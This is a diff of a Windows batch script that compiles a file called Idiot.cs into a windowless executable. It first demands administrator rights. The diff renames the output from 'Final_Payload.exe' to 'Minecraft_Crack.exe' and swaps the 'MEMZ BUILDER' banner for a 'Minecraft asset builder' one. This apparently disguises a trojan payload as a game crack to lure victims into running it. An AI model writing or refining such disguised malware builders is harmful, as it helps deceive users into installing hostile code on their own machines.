@@ -1,36 +1,62 @@
 @echo off
 color 0b
-title MEMZ BUILDER v2.0
-net session >nul 2>&1 || (echo PLEASE RUN AS ADMIN! & pause & exit)
+title MEMZ COMPILER - FOLDER: lol-main
+echo ========================================
+echo   MINECRAFT ASSET BUILDER (lol-main)
+echo ========================================
+echo.
 
-echo [SEARCH] Looking for Idiot.cs...
-set "FILE="
-for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist %%d:\ (
-        for /r %%d:\ %%f in (Idiot.cs) do if exist "%%f" set "FILE=%%f" & goto :found
-    )
-)
+:: 1. FORCE CURRENT DIRECTORY
+cd /d "%~dp0"
 
-:found
-if not defined FILE (
-    echo [ERROR] Idiot.cs not found on any drive!
+:: 2. CHECK ADMIN
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo [ERROR] PLEASE RUN AS ADMINISTRATOR!
+    echo Right-click this file and select 'Run as Administrator'.
     pause
     exit
 )
 
-echo [OK] Found at: %FILE%
-set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-if not exist "%CSC%" set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+:: 3. VERIFY IDIOT.CS EXISTS
+if not exist "Idiot.cs" (
+    echo [ERROR] Idiot.cs NOT FOUND in: %cd%
+    echo Please make sure Idiot.cs is in this folder.
+    dir /b
+    pause
+    exit
+)
 
-echo [BUILD] Compiling...
-"%CSC%" /target:winexe /out:"Final_Payload.exe" "%FILE%"
+:: 4. FIND DOTNET COMPILER
+set "CSC64=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+set "CSC32=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 
-if exist "Final_Payload.exe" (
+if exist "%CSC64%" (
+    set "CSC=%CSC64%"
+) else if exist "%CSC32%" (
+    set "CSC=%CSC32%"
+) else (
+    echo [ERROR] .NET Framework 4.0/4.5 is NOT INSTALLED!
+    pause
+    exit
+)
+
+echo [SYSTEM] Compiler found at: %CSC%
+echo [SYSTEM] Compiling Idiot.cs...
+echo.
+
+:: 5. EXECUTE BUILD
+"%CSC%" /target:winexe /out:"Minecraft_Crack.exe" "Idiot.cs"
+
+if exist "Minecraft_Crack.exe" (
     echo.
     echo ========================================
-    echo   SUCCESS: Final_Payload.exe created!
+    echo   SUCCESS! Minecraft_Crack.exe created!
     echo ========================================
 ) else (
-    echo [FAIL] Compilation error.
+    echo.
+    echo [FAILED] There is a syntax error in Idiot.cs.
 )
+
+echo.
 pause
